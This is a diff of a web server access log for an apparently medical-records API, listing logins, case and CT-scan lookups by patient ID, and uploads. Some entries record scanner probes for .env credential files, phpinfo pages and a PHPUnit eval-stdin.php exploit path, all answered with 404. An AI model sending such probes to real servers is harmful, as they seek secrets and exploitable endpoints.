-[pid: 2313|app: 0|req: 75/215] 121.43.54.116 () {40 vars in 662 bytes} [Thu May  2 03:29:51 2024] GET /api => generated 2433 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api-docs
-[pid: 2313|app: 0|req: 76/216] 121.43.54.116 () {40 vars in 672 bytes} [Thu May  2 03:29:55 2024] GET /api-docs => generated 2448 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/systeminfo
-[pid: 2310|app: 0|req: 33/217] 121.43.54.116 () {40 vars in 684 bytes} [Thu May  2 03:29:57 2024] GET /api/systeminfo => generated 2466 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/query
-[pid: 2313|app: 0|req: 77/218] 121.43.54.116 () {40 vars in 735 bytes} [Thu May  2 03:30:02 2024] GET /api/v1/query?query=prometheus_build_info => generated 2488 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api.php
-[pid: 2309|app: 0|req: 40/219] 121.43.54.116 () {40 vars in 670 bytes} [Thu May  2 03:30:23 2024] GET /api.php => generated 2445 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/avatar/defaultx20.jpg
-[pid: 2309|app: 0|req: 41/220] 121.43.54.116 () {40 vars in 706 bytes} [Thu May  2 03:30:48 2024] GET /api/avatar/defaultx20.jpg => generated 2499 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/ad/v2/version
-[pid: 2310|app: 0|req: 34/221] 121.43.54.116 () {40 vars in 690 bytes} [Thu May  2 03:30:55 2024] GET /api/ad/v2/version => generated 2475 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/v1/status/system-info
-[pid: 2312|app: 0|req: 70/222] 121.43.54.116 () {40 vars in 706 bytes} [Thu May  2 03:31:13 2024] GET /api/v1/status/system-info => generated 2499 bytes in 6 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/count.php
-[pid: 2312|app: 0|req: 71/223] 121.43.54.116 () {40 vars in 682 bytes} [Thu May  2 03:31:28 2024] GET /api/count.php => generated 2463 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/get_keywords.php
-[pid: 2312|app: 0|req: 72/224] 121.43.54.116 () {40 vars in 696 bytes} [Thu May  2 03:31:30 2024] GET /api/get_keywords.php => generated 2484 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api
-[pid: 2312|app: 0|req: 73/225] 121.40.42.124 () {40 vars in 667 bytes} [Thu May  2 17:42:22 2024] GET /api => generated 2438 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api-docs
-[pid: 2313|app: 0|req: 78/226] 121.40.42.124 () {40 vars in 677 bytes} [Thu May  2 17:42:25 2024] GET /api-docs => generated 2453 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/systeminfo
-[pid: 2313|app: 0|req: 79/227] 121.40.42.124 () {40 vars in 689 bytes} [Thu May  2 17:42:26 2024] GET /api/systeminfo => generated 2471 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/query
-[pid: 2313|app: 0|req: 80/228] 121.40.42.124 () {40 vars in 740 bytes} [Thu May  2 17:42:30 2024] GET /api/v1/query?query=prometheus_build_info => generated 2493 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api.php
-[pid: 2309|app: 0|req: 42/229] 121.40.42.124 () {40 vars in 675 bytes} [Thu May  2 17:42:49 2024] GET /api.php => generated 2450 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/avatar/defaultx20.jpg
-[pid: 2309|app: 0|req: 43/230] 121.40.42.124 () {40 vars in 711 bytes} [Thu May  2 17:43:14 2024] GET /api/avatar/defaultx20.jpg => generated 2504 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/ad/v2/version
-[pid: 2309|app: 0|req: 44/231] 121.40.42.124 () {40 vars in 695 bytes} [Thu May  2 17:43:22 2024] GET /api/ad/v2/version => generated 2480 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/status/system-info
-[pid: 2312|app: 0|req: 74/232] 121.40.42.124 () {40 vars in 711 bytes} [Thu May  2 17:43:38 2024] GET /api/v1/status/system-info => generated 2504 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/count.php
-[pid: 2310|app: 0|req: 35/233] 121.40.42.124 () {40 vars in 687 bytes} [Thu May  2 17:43:52 2024] GET /api/count.php => generated 2468 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/get_keywords.php
-[pid: 2313|app: 0|req: 81/234] 121.40.42.124 () {40 vars in 701 bytes} [Thu May  2 17:43:54 2024] GET /api/get_keywords.php => generated 2489 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/session/properties
-[pid: 2313|app: 0|req: 82/235] 185.180.143.18 () {34 vars in 530 bytes} [Fri May  3 14:53:57 2024] GET /api/session/properties => generated 2489 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 75/236] 91.223.3.140 () {36 vars in 445 bytes} [Fri May  3 18:57:11 2024] GET /api/.env => generated 2447 bytes in 6 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 76/237] 54.202.110.255 () {34 vars in 492 bytes} [Fri May  3 20:46:33 2024] GET /api/.env => generated 2448 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/info.php
-[pid: 2313|app: 0|req: 83/238] 54.202.110.255 () {34 vars in 500 bytes} [Fri May  3 20:47:27 2024] GET /api/info.php => generated 2460 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/phpinfo.php
-[pid: 2312|app: 0|req: 77/239] 54.202.110.255 () {34 vars in 506 bytes} [Fri May  3 20:47:28 2024] GET /api/phpinfo.php => generated 2469 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env.local
-[pid: 2313|app: 0|req: 84/240] 54.202.110.255 () {34 vars in 504 bytes} [Fri May  3 20:48:42 2024] GET /api/.env.local => generated 2466 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/.env.production
-[pid: 2313|app: 0|req: 85/241] 54.202.110.255 () {34 vars in 514 bytes} [Fri May  3 20:48:43 2024] GET /api/.env.production => generated 2481 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env.staging
-[pid: 2313|app: 0|req: 86/242] 54.202.110.255 () {34 vars in 508 bytes} [Fri May  3 20:48:43 2024] GET /api/.env.staging => generated 2472 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/src/.env
-[pid: 2310|app: 0|req: 36/243] 54.202.110.255 () {34 vars in 500 bytes} [Fri May  3 20:48:43 2024] GET /api/src/.env => generated 2460 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /apis/.env
-[pid: 2310|app: 0|req: 37/244] 54.202.110.255 () {34 vars in 494 bytes} [Fri May  3 20:48:43 2024] GET /apis/.env => generated 2451 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /apis/.env.local
-[pid: 2309|app: 0|req: 45/245] 54.202.110.255 () {34 vars in 506 bytes} [Fri May  3 20:48:43 2024] GET /apis/.env.local => generated 2469 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /apis/.env.production
-[pid: 2313|app: 0|req: 87/246] 54.202.110.255 () {34 vars in 516 bytes} [Fri May  3 20:48:44 2024] GET /apis/.env.production => generated 2484 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /apis/.env.staging
-[pid: 2309|app: 0|req: 46/247] 54.202.110.255 () {34 vars in 510 bytes} [Fri May  3 20:48:44 2024] GET /apis/.env.staging => generated 2475 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api-config.ini
-[pid: 2312|app: 0|req: 78/248] 54.202.110.255 () {34 vars in 504 bytes} [Fri May  3 20:51:51 2024] GET /api-config.ini => generated 2466 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/index.php/v1/config/application
-[pid: 2312|app: 0|req: 79/249] 54.202.110.255 () {34 vars in 546 bytes} [Fri May  3 20:53:43 2024] GET /api/index.php/v1/config/application => generated 2529 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 80/250] 191.96.207.190 () {36 vars in 483 bytes} [Sat May  4 15:15:50 2024] GET /api/.env => generated 2447 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 81/251] 191.96.207.190 () {40 vars in 639 bytes} [Sat May  4 15:15:51 2024] POST /api/.env => generated 2448 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-[pid: 2312|app: 0|req: 82/252] 101.126.88.14 () {40 vars in 607 bytes} [Mon May  6 01:54:49 2024] GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2588 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 83/253] 219.239.227.174 () {44 vars in 764 bytes} [Tue May  7 22:37:13 2024] POST /api/user/login => generated 296 bytes in 969 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 84/254] 219.239.227.174 () {40 vars in 823 bytes} [Tue May  7 22:37:15 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 4193 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-用户id  : 5
-[pid: 2310|app: 0|req: 38/255] 219.239.227.174 () {40 vars in 836 bytes} [Tue May  7 22:37:20 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 317 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 47/256] 219.239.227.174 () {40 vars in 854 bytes} [Tue May  7 22:37:20 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 322 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 85/257] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 22:37:28 2024] GET /api/medical/get_all_patient => generated 2360 bytes in 2059 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 88/258] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:29 2024] GET /api/medical/get_case?patient_id=1 => generated 74 bytes in 929 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 39/259] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:30 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 1450 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 89/260] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:51 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2309|app: 0|req: 48/261] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:53 2024] GET /api/medical/get_case?patient_id=1 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 40/262] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:54 2024] GET /api/medical/get_case?patient_id=3 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 41/263] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:55 2024] GET /api/medical/get_case?patient_id=7 => generated 74 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 90/264] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:37:56 2024] GET /api/medical/get_case?patient_id=10 => generated 74 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 49/265] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:37:56 2024] GET /api/medical/get_case?patient_id=12 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 50/266] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:37:57 2024] GET /api/medical/get_case?patient_id=10 => generated 74 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 86/267] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:57 2024] GET /api/medical/get_case?patient_id=7 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 87/268] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:58 2024] GET /api/medical/get_case?patient_id=3 => generated 74 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 91/269] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:58 2024] GET /api/medical/get_case?patient_id=1 => generated 74 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 42/270] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:59 2024] GET /api/medical/get_case?patient_id=3 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 43/271] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:37:59 2024] GET /api/medical/get_case?patient_id=7 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 44/272] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:38:00 2024] GET /api/medical/get_case?patient_id=10 => generated 74 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2313|app: 0|req: 92/273] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:40:59 2024] POST /api/medical/upload => generated 7641 bytes in 1227 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 88/274] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:41:36 2024] POST /api/medical/upload => generated 7641 bytes in 1218 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 89/275] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:41:44 2024] POST /api/medical/upload => generated 7641 bytes in 1177 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 90/276] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:41:53 2024] POST /api/medical/upload => generated 7641 bytes in 1138 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 91/277] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:42:50 2024] POST /api/medical/upload => generated 7641 bytes in 1113 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2313|app: 0|req: 93/278] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:42:59 2024] POST /api/medical/upload => generated 7641 bytes in 1043 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2313|app: 0|req: 94/279] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:43:04 2024] POST /api/medical/upload => generated 7641 bytes in 1124 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 1
-[pid: 2312|app: 0|req: 92/280] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:43:10 2024] POST /api/medical/upload => generated 7641 bytes in 1088 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 95/281] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 22:43:51 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 163 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 93/282] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:43:51 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 45/283] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:43:53 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 46/284] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:43:56 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 94/285] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:43:56 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 51/286] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:43:57 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 96/287] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:43:59 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 97/288] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:44:03 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2309|app: 0|req: 52/289] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:44:04 2024] GET /api/medical/get_case?patient_id=1 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2309|app: 0|req: 53/290] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:44:06 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 98/291] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:44:07 2024] GET /api/medical/get_case?patient_id=1 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 99/292] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:44:08 2024] GET /api/medical/get_case?patient_id=1 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 1
-[pid: 2312|app: 0|req: 95/293] 219.239.227.174 () {42 vars in 839 bytes} [Tue May  7 22:44:23 2024] POST /api/medical/upload => generated 3737 bytes in 579 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 96/294] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 22:44:28 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 97/295] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:44:28 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 98/296] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:44:29 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 54/297] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:44:35 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 47/298] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:44:36 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 55/299] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 22:44:37 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 96 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 100/300] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:44:37 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 101/301] 219.239.227.174 () {40 vars in 819 bytes} [Tue May  7 22:44:39 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 97 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2309|app: 0|req: 56/302] 219.239.227.174 () {40 vars in 832 bytes} [Tue May  7 22:44:39 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 99/303] 219.239.227.174 () {40 vars in 830 bytes} [Tue May  7 22:44:41 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552739|app: 0|req: 14/67] 92.205.160.111 () {38 vars in 590 bytes} [Tue May  7 23:18:29 2024] GET /api/.env => generated 2448 bytes in 9 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
+[pid: 1552740|app: 0|req: 8/68] 220.196.160.76 () {42 vars in 863 bytes} [Wed May  8 04:58:45 2024] GET /api/medical/get_ct?patient_id=1&case_id=20 => generated 43 bytes in 51 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 26/69] 219.239.227.174 () {46 vars in 792 bytes} [Thu May  9 21:35:27 2024] POST /api/user/login => generated 296 bytes in 642 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552742|app: 0|req: 27/70] 219.239.227.174 () {42 vars in 851 bytes} [Thu May  9 21:35:28 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 2427 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+用户id  : 5
+用户id  : 5
+[pid: 1552743|app: 0|req: 23/71] 219.239.227.174 () {42 vars in 882 bytes} [Thu May  9 21:35:32 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 1242 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 23/72] 219.239.227.174 () {42 vars in 864 bytes} [Thu May  9 21:35:32 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 1295 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+[pid: 1552742|app: 0|req: 28/73] 219.239.227.174 () {48 vars in 954 bytes} [Thu May  9 21:35:50 2024] POST /api/medical/annotate => generated 146 bytes in 774 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 24/74] 219.239.227.174 () {48 vars in 954 bytes} [Thu May  9 21:35:54 2024] POST /api/medical/annotate => generated 147 bytes in 497 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 25/75] 219.239.227.174 () {48 vars in 954 bytes} [Thu May  9 21:35:55 2024] POST /api/medical/annotate => generated 146 bytes in 508 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552742|app: 0|req: 29/76] 219.239.227.174 () {42 vars in 847 bytes} [Thu May  9 21:39:06 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
+用户id  : 5
+[pid: 1552743|app: 0|req: 26/77] 219.239.227.174 () {42 vars in 858 bytes} [Thu May  9 21:39:07 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+用户id  : 5
+[pid: 1552740|app: 0|req: 9/78] 219.239.227.174 () {42 vars in 860 bytes} [Thu May  9 21:39:08 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+用户id  : 5
+[pid: 1552740|app: 0|req: 10/79] 219.239.227.174 () {42 vars in 867 bytes} [Thu May  9 21:39:09 2024] GET /api/medical/get_case?patient_id=12 => generated 227 bytes in 110 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 27/80] 219.239.227.174 () {42 vars in 885 bytes} [Thu May  9 21:39:09 2024] GET /api/medical/get_ct?patient_id=12&case_id=27 => generated 10417 bytes in 115 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552742|app: 0|req: 30/81] 219.239.227.174 () {42 vars in 847 bytes} [Thu May  9 21:39:41 2024] GET /api/medical/get_all_patient => generated 2513 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552743|app: 0|req: 28/82] 219.239.227.174 () {42 vars in 858 bytes} [Thu May  9 21:39:41 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+用户id  : 5
+[pid: 1552742|app: 0|req: 31/83] 219.239.227.174 () {42 vars in 858 bytes} [Thu May  9 21:41:55 2024] GET /api/medical/get_case?patient_id=1 => generated 382 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+用户id  : 5
+[pid: 1552742|app: 0|req: 32/84] 219.239.227.174 () {42 vars in 858 bytes} [Thu May  9 21:41:56 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 98 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
+用户id  : 5
+[pid: 1552742|app: 0|req: 33/85] 219.239.227.174 () {42 vars in 858 bytes} [Thu May  9 21:41:59 2024] GET /api/medical/get_case?patient_id=7 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
+用户id  : 5
